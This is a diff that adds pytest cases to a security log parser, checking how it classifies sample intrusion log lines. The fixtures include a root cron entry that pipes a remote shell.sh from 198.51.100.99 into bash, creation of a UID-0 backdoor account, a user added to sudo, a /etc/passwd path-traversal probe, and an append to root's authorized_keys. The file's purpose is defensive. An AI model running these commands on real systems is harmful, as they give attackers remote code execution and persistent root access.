@@ -135,3 +135,74 @@ def test_invalid_timestamp_graceful_fallback(parser):
     assert parsed.timestamp is None
     assert parsed.event_type == "auth_failure"
 
+
+def test_parse_account_management_logs(parser):
+    line_useradd = "Nov 07 16:00:01 fenn useradd[4500]: new user: name=backdoor_admin, UID=0, GID=0, home=/root, shell=/bin/bash"
+    ev1 = parser.parse_line(line_useradd)
+    assert ev1 is not None
+    assert ev1.event_type == "account_created"
+    assert ev1.user == "backdoor_admin"
+    assert ev1.details["uid"] == "0"
+
+    line_usermod = "Nov 07 16:01:00 fenn usermod[4505]: add 'www-data' to group 'sudo'"
+    ev2 = parser.parse_line(line_usermod)
+    assert ev2 is not None
+    assert ev2.event_type == "privilege_group_added"
+    assert ev2.user == "www-data"
+    assert ev2.details["group"] == "sudo"
+
+
+def test_parse_firewall_and_kernel_logs(parser):
+    line_ufw = "Nov 07 16:02:10 fenn kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11 SRC=203.0.113.77 DST=192.168.1.10 LEN=40 PROTO=TCP SPT=51122 DPT=3306 WINDOW=1024"
+    ev_ufw = parser.parse_line(line_ufw)
+    assert ev_ufw is not None
+    assert ev_ufw.event_type == "firewall_block"
+    assert ev_ufw.source_ip == "203.0.113.77"
+    assert ev_ufw.details["dest_port"] == 3306
+
+    line_segfault = "Nov 07 16:03:00 fenn kernel: nginx[9123]: segfault at 0000000000000008 ip 00007f8b1c in libc.so.6[7f8b1c000+190000]"
+    ev_seg = parser.parse_line(line_segfault)
+    assert ev_seg is not None
+    assert ev_seg.event_type == "kernel_segfault"
+    assert ev_seg.details["process_name"] == "nginx"
+    assert ev_seg.details["library"] == "libc.so.6"
+
+
+def test_parse_cron_and_systemd_logs(parser):
+    line_cron = "Nov 07 16:04:00 fenn CRON[5001]: (root) CMD (curl -s http://198.51.100.99/shell.sh | bash)"
+    ev_cron = parser.parse_line(line_cron)
+    assert ev_cron is not None
+    assert ev_cron.event_type == "cron_execution"
+    assert ev_cron.user == "root"
+    assert "curl -s" in ev_cron.details["command"]
+
+    line_systemd = "Nov 07 16:05:00 fenn systemd[1]: ufw.service: Deactivated successfully."
+    ev_sys = parser.parse_line(line_systemd)
+    assert ev_sys is not None
+    assert ev_sys.event_type == "service_stopped"
+    assert ev_sys.details["unit"] == "ufw.service"
+
+
+def test_parse_web_access_log_high_signal_filtering(parser):
+    # Normal HTTP 200 static asset is ignored (returns None)
+    normal_web = '192.0.2.10 - - [07/Nov/2026:16:06:00 +0000] "GET /assets/logo.png HTTP/1.1" 200 1024 "-" "Mozilla/5.0"'
+    assert parser.parse_line(normal_web) is None
+
+    # Path traversal probe is captured
+    attack_web = '198.51.100.88 - - [07/Nov/2026:16:06:05 +0000] "GET /../../etc/passwd HTTP/1.1" 404 196 "-" "sqlmap/1.7"'
+    ev_web = parser.parse_line(attack_web)
+    assert ev_web is not None
+    assert ev_web.event_type == "web_attack_probe"
+    assert ev_web.source_ip == "198.51.100.88"
+    assert ev_web.details["attack_category"] == "path_traversal"
+
+
+def test_parse_critical_file_tamper_log(parser):
+    line_tamper = "Nov 07 16:07:00 fenn sudo[6100]:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys"
+    ev_tamper = parser.parse_line(line_tamper)
+    assert ev_tamper is not None
+    assert ev_tamper.event_type == "critical_file_modified"
+    assert ev_tamper.user == "ubuntu"
+    assert "authorized_keys" in ev_tamper.details["target_file"]
+
+
